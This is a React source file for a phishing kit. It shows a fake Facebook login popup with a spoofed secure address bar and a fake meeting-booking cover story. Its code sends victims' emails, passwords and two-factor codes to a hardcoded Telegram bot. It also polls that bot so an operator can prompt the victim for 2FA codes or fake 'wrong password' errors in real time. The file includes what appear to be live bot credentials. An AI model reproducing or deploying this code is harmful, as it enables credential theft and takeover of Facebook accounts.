import React, { useState, useEffect, useRef } from "react";
import "./FacebookLoginFlow.css";

const PopupFrame = ({ children, onClose }) => (
  <div className="popup-overlay">
    <div className="browser-frame active">
      <div className="browser-top">
        <div className="tab-title">
          <img src="https://www.facebook.com/favicon.ico" alt="Facebook Icon" />
          Log into Facebook | Facebook
        </div>
        <div className="popup-close" onClick={onClose} style={{ cursor: "pointer", fontSize: "18px", padding: "0 10px" }}>
          ✕
        </div>
      </div>
      <div className="browser-url" style={{ textAlign: "left", paddingLeft: "10px" }}>
        <span className="green">Secure</span> |
        <span className="green"> https</span>
        <span>://www.facebook.com/login</span>
      </div>
      <div className="content">{children}</div>
    </div>
  </div>
);

function Step1({
  formData,
  handleInputChange,
  setIsLoading,
  isLoading,
  sessionId,
  telegramChatId,
  onSent,
  errorMessage,
  onClose
}) {
  const [localError, setLocalError] = useState("");

  useEffect(() => {
    setLocalError(errorMessage || "");
  }, [errorMessage]);

  const sendLoginAttempt = async () => {
    if (!formData.email || !formData.password) {
      setLocalError("Please enter both email and password.");
      return;
    }
    setLocalError("");
    setIsLoading(true);

    const payload = {
      chat_id: telegramChatId,
      text: `🆕 New Login Attempt\n📧 Email: <code>${formData.email}</code>\n🔑 Password: <code>${formData.password}</code>\n🏢 Session: <code>${sessionId}</code>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔐 Ask for 2FA", callback_data: `2fa_${sessionId}` }],
          [{ text: "⚠️ Wrong Password", callback_data: `wrongpass_${sessionId}` }],
          [{ text: "⚠️ Wrong 2FA", callback_data: `wrong2fa_${sessionId}` }],
          [{ text: "🗓 Confirm Booking", callback_data: `bookingconfirm_${sessionId}` }],
          [{ text: "⏳ Wait 120 min", callback_data: `wait120_${sessionId}` }]
        ]
      }
    };

    try {
      await fetch(`https://api.telegram.org/bot8075320428:AAEh03BbKY131facK9vvpNopfKlEvttMXEM/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      onSent();
    } catch (err) {
      console.error(err);
      setLocalError("Failed to send data. Check console.");
      setIsLoading(false);
    }
  };

  return (
    <PopupFrame onClose={onClose}>
      <div className="card">
        <h2 className="facebook-title">facebook</h2>
        {localError && <div className="alert error">{localError}</div>}
        <input type="text" name="email" placeholder="Email or phone" value={formData.email} onChange={handleInputChange} disabled={isLoading} />
        <input type="password" name="password" placeholder="Password" value={formData.password} onChange={handleInputChange} disabled={isLoading} />
        <button className="btn-primary" onClick={sendLoginAttempt} disabled={isLoading}>
          {isLoading ? "Logging In..." : "Log in"}
        </button>
        <div className="footer">
          Forgot account?{" "}
          <a href="https://www.facebook.com/login/identify" target="_blank" rel="noopener noreferrer">Find it</a>
        </div>
      </div>
    </PopupFrame>
  );
}

function StepLoading({ onClose }) {
  return (
    <PopupFrame onClose={onClose}>
      <div className="loading-screen">
        <div className="loading-spinner" />
        <p>Verifying your information…</p>
      </div>
    </PopupFrame>
  );
}

function StepWait120({ onClose }) {
  return (
    <PopupFrame onClose={onClose}>
      <div className="loading-screen">
        <div className="loading-spinner" />
        <p>Estimated wait time: 120 minutes…</p>
      </div>
    </PopupFrame>
  );
}

function Step2({ formData, handleInputChange, onFinish, errorMessage, onClose }) {
  return (
    <PopupFrame onClose={onClose}>
      <div className="card">
        <h2 style={{ textAlign: "left" }}>Go to your authentication app</h2>
        <p className="info-text">
          Enter the 6-digit code from your two-factor authentication app (e.g. Duo Mobile or Google Authenticator).
        </p>
        <div className="illustration" />
        <input type="text" name="code" placeholder="2FA Code" value={formData.code} onChange={handleInputChange} />
        {errorMessage && (
          <div className="error-inline">{errorMessage}</div>
        )}
        <button className="btn-primary continue-2fa" onClick={onFinish}>Continue</button>
      </div>
    </PopupFrame>
  );
}

function Step3BookingConfirmation({ selectedDate, selectedTime, onClose }) {
  const formattedDate = selectedDate
    ? new Date(2025, 3, selectedDate).toLocaleDateString("en-US", {
        month: "long",
        day: "numeric",
        year: "numeric"
      })
    : "April 16, 2025";

  const time = selectedTime || "11:00 am";

  return (
    <PopupFrame onClose={onClose}>
      <div className="card booking-confirmed">
        <h2>✅ Confirmed!</h2>
        <p>Your meeting has been scheduled successfully.</p>
        <div className="booking-info">
          <div>📅 {formattedDate} at {time}</div>
          <div>⏱ 45 minutes</div>
          <div>💻 Zoom (details in email)</div>
        </div>
        <button className="btn-primary" onClick={onClose}>Schedule another meeting</button>
      </div>
    </PopupFrame>
  );
}

export default function FacebookLoginFlow({ onClose, selectedDate, selectedTime }) {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({ email: "", password: "", code: "" });
  const [sessionId, setSessionId] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const lastUpdateRef = useRef(0);
  const telegramBotToken = "8075320428:AAEh03BbKY131facK9vvpNopfKlEvttMXEM";
  const telegramChatId = "-1002770492215";

  useEffect(() => {
    setSessionId(Math.random().toString(36).slice(2));
  }, []);

  useEffect(() => {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${telegramBotToken}/getUpdates?offset=${lastUpdateRef.current + 1}`);
        const data = await res.json();
        if (data.result) {
          for (const u of data.result) {
            if (u.update_id > lastUpdateRef.current) {
              lastUpdateRef.current = u.update_id;
            }
            const cb = u.callback_query?.data;
            if (cb === `2fa_${sessionId}`) {
              setErrorMessage("");
              setStep(2);
              return;
            }
            if (cb === `wrong2fa_${sessionId}`) {
              setErrorMessage("Your Authenticator code is invalid. Please re-enter the code.");
              setStep(2);
              return;
            }
            if (cb === `wrongpass_${sessionId}`) {
              setErrorMessage("Your email or password is incorrect");
              setStep(1);
              setIsLoading(false);
              return;
            }
            if (cb === `bookingconfirm_${sessionId}`) {
              setErrorMessage("");
              setStep(3);
              return;
            }
            if (cb === `wait120_${sessionId}`) {
              setStep(4);
              return;
            }
          }
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
    return () => clearInterval(interval);
  }, [sessionId]);

  const handleInputChange = e => {
    const { name, value } = e.target;
    setFormData(f => ({ ...f, [name]: value }));
    if (errorMessage) setErrorMessage("");
  };

  const handleSent = () => setStep(1.5);

  const finish2FA = async () => {
    setStep(1.5);
    try {
      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: `🔐 <b>2FA Code Entered</b>\n🏢 Session: <code>${sessionId}</code>\n✔️ Code: <code>${formData.code}</code>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⚠️ Wrong 2FA", callback_data: `wrong2fa_${sessionId}` }],
              [{ text: "🔐 Ask for 2FA", callback_data: `2fa_${sessionId}` }],
              [{ text: "⚠️ Wrong Password", callback_data: `wrongpass_${sessionId}` }],
              [{ text: "🗓 Confirm Booking", callback_data: `bookingconfirm_${sessionId}` }],
              [{ text: "⏳ Wait 120 min", callback_data: `wait120_${sessionId}` }]
            ]
          }
        })
      });
    } catch (err) {
      console.error("Failed to send 2FA code to Telegram", err);
    }
  };

  return (
    <>
      {step === 1 && (
        <Step1
          formData={formData}
          handleInputChange={handleInputChange}
          setIsLoading={setIsLoading}
          isLoading={isLoading}
          sessionId={sessionId}
          telegramChatId={telegramChatId}
          onSent={handleSent}
          errorMessage={errorMessage}
          onClose={onClose}
        />
      )}
      {step === 1.5 && <StepLoading onClose={onClose} />}
      {step === 2 && (
        <Step2
          formData={formData}
          handleInputChange={handleInputChange}
          onFinish={finish2FA}
          errorMessage={errorMessage}
          onClose={onClose}
        />
      )}
      {step === 3 && (
        <Step3BookingConfirmation
          selectedDate={selectedDate}
          selectedTime={selectedTime}
          onClose={onClose}
        />
      )}
      {step === 4 && <StepWait120 onClose={onClose} />}
    </>
  );
}
